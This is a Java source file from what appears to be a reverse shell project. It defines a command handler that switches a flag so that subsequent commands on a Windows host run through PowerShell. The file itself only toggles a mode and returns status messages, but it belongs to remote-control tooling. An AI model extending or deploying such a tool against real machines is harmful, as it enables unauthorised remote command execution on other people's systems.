package com.mtattab.reverseshell.service.commands;

import com.mtattab.reverseshell.model.CommandRestOutput;
import com.mtattab.reverseshell.service.Command;
import com.mtattab.reverseshell.util.SystemCommandProxyUtil;

public class TogglePowerShellCommand implements Command {
    @Override
    public String executeCommand(String command) {
        if (SystemCommandProxyUtil.isWindows && togglePowerShell(command) != null) {
            return "Switched to powershell successfuly" ;


        }
        return "there is a problem with the command" ;
    }

    private static String togglePowerShell(String commands){
        if (commands.toLowerCase().contains("powershell")){
            SystemCommandProxyUtil.runPowerShell= !SystemCommandProxyUtil.runPowerShell;
            return "Switched to Powershell mode";

        }
        return null;
    }
}
